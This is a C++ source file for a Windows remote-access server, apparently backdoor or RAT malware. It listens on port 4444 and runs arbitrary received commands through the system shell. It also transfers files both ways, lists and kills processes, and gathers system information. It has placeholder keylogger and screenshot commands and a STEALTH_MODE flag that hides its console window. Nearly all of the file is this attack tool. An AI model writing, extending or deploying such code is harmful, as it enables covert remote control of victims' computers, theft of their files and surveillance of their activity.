#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <vector>
#include <cstdlib>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

class AdvancedRemoteAccessServer {
private:
    SOCKET serverSocket;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    struct sockaddr_in clientAddr;
    int clientAddrLen;
    bool isRunning;
    std::string logFile;
    
public:
    AdvancedRemoteAccessServer() : isRunning(false), clientSocket(INVALID_SOCKET), logFile("server.log") {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~AdvancedRemoteAccessServer() {
        cleanup();
        WSACleanup();
    }
    
    bool startServer(int port) {
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            logMessage("Socket creation failed");
            return false;
        }
        
        // Allow socket reuse
        int opt = 1;
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            logMessage("Bind failed");
            return false;
        }
        
        if (listen(serverSocket, 5) == SOCKET_ERROR) {
            logMessage("Listen failed");
            return false;
        }
        
        logMessage("Server started on port " + std::to_string(port));
        isRunning = true;
        return true;
    }
    
    bool acceptClient() {
        clientAddrLen = sizeof(clientAddr);
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket == INVALID_SOCKET) {
            logMessage("Accept failed");
            return false;
        }
        
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        logMessage("Client connected from " + std::string(clientIP));
        return true;
    }
    
    void handleClient() {
        char buffer[8192];
        while (isRunning) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) {
                logMessage("Client disconnected");
                break;
            }
            
            buffer[bytesReceived] = '\0';
            std::string command(buffer);
            logMessage("Received command: " + command);
            
            if (command == "exit") {
                break;
            }
            
            std::string response = processCommand(command);
            send(clientSocket, response.c_str(), response.length(), 0);
        }
    }
    
    std::string processCommand(const std::string& command) {
        // Built-in commands
        if (command.substr(0, 3) == "cd ") {
            return changeDirectory(command.substr(3));
        }
        
        if (command == "pwd") {
            return getCurrentDirectory();
        }
        
        if (command == "sysinfo") {
            return getSystemInfo();
        }
        
        if (command == "processes") {
            return getProcessList();
        }
        
        if (command.substr(0, 5) == "kill ") {
            return killProcess(command.substr(5));
        }
        
        if (command.substr(0, 9) == "download ") {
            return downloadFile(command.substr(9));
        }
        
        if (command.substr(0, 7) == "upload ") {
            return uploadFile(command.substr(7));
        }
        
        if (command == "screenshot") {
            return takeScreenshot();
        }
        
        if (command.substr(0, 8) == "keylog ") {
            return handleKeylogger(command.substr(8));
        }
        
        // Execute system command
        return executeSystemCommand(command);
    }
    
    std::string changeDirectory(const std::string& path) {
        if (SetCurrentDirectoryA(path.c_str())) {
            return "Directory changed to: " + path + "\n";
        } else {
            return "Failed to change directory to: " + path + "\n";
        }
    }
    
    std::string getCurrentDirectory() {
        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);
        return std::string(currentDir) + "\n";
    }
    
    std::string getSystemInfo() {
        std::stringstream info;
        
        // Computer name
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            info << "Computer Name: " << computerName << "\n";
        }
        
        // Username
        char username[UNLEN + 1];
        size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            info << "Username: " << username << "\n";
        }
        
        // OS Version
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        if (GetVersionExA(&osvi)) {
            info << "OS Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "\n";
        }
        
        // Memory info
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (GlobalMemoryStatusEx(&memInfo)) {
            info << "Total RAM: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
            info << "Available RAM: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
        }
        
        return info.str();
    }
    
    std::string getProcessList() {
        std::stringstream processes;
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            return "Failed to get process list\n";
        }
        
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (!Process32First(hProcessSnap, &pe32)) {
            CloseHandle(hProcessSnap);
            return "Failed to get first process\n";
        }
        
        processes << "PID\tProcess Name\n";
        processes << "---\t------------\n";
        
        do {
            processes << pe32.th32ProcessID << "\t" << pe32.szExeFile << "\n";
        } while (Process32Next(hProcessSnap, &pe32));
        
        CloseHandle(hProcessSnap);
        return processes.str();
    }
    
    std::string killProcess(const std::string& pidStr) {
        DWORD pid = std::stoul(pidStr);
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        
        if (hProcess == NULL) {
            return "Failed to open process " + pidStr + "\n";
        }
        
        if (TerminateProcess(hProcess, 0)) {
            CloseHandle(hProcess);
            return "Process " + pidStr + " terminated\n";
        } else {
            CloseHandle(hProcess);
            return "Failed to terminate process " + pidStr + "\n";
        }
    }
    
    std::string downloadFile(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            return "ERROR: Cannot open file " + filename + "\n";
        }
        
        std::stringstream buffer;
        buffer << file.rdbuf();
        file.close();
        
        std::string content = buffer.str();
        std::string response = "FILE_START:" + filename + "\n";
        response += "SIZE:" + std::to_string(content.size()) + "\n";
        response += content;
        response += "\nFILE_END\n";
        
        return response;
    }
    
    std::string uploadFile(const std::string& data) {
        // Parse upload command: upload filename:base64data
        size_t colonPos = data.find(':');
        if (colonPos == std::string::npos) {
            return "Invalid upload format\n";
        }
        
        std::string filename = data.substr(0, colonPos);
        std::string fileData = data.substr(colonPos + 1);
        
        std::ofstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            return "Failed to create file " + filename + "\n";
        }
        
        file.write(fileData.c_str(), fileData.size());
        file.close();
        
        return "File " + filename + " uploaded successfully\n";
    }
    
    std::string takeScreenshot() {
        // Simplified screenshot function
        return "Screenshot functionality not implemented in this version\n";
    }
    
    std::string handleKeylogger(const std::string& action) {
        if (action == "start") {
            return "Keylogger functionality not implemented in this version\n";
        } else if (action == "stop") {
            return "Keylogger not running\n";
        } else if (action == "dump") {
            return "No keylog data available\n";
        }
        return "Invalid keylogger command\n";
    }
    
    std::string executeSystemCommand(const std::string& command) {
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "Command execution failed\n";
        }
        
        std::string result;
        char buffer[256];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        _pclose(pipe);
        
        if (result.empty()) {
            result = "Command executed successfully (no output)\n";
        }
        
        return result;
    }
    
    void logMessage(const std::string& message) {
        std::ofstream log(logFile, std::ios::app);
        if (log.is_open()) {
            SYSTEMTIME st;
            GetSystemTime(&st);
            log << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
                << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] "
                << message << std::endl;
            log.close();
        }
        
        #ifndef STEALTH_MODE
        std::cout << message << std::endl;
        #endif
    }
    
    void cleanup() {
        isRunning = false;
        if (clientSocket != INVALID_SOCKET) {
            closesocket(clientSocket);
        }
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
    }
    
private:
    WSADATA wsaData;
};

int main() {
    #ifdef STEALTH_MODE
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
    
    AdvancedRemoteAccessServer server;
    
    if (!server.startServer(4444)) {
        return 1;
    }
    
    while (true) {
        if (server.acceptClient()) {
            server.handleClient();
        }
    }
    
    return 0;
}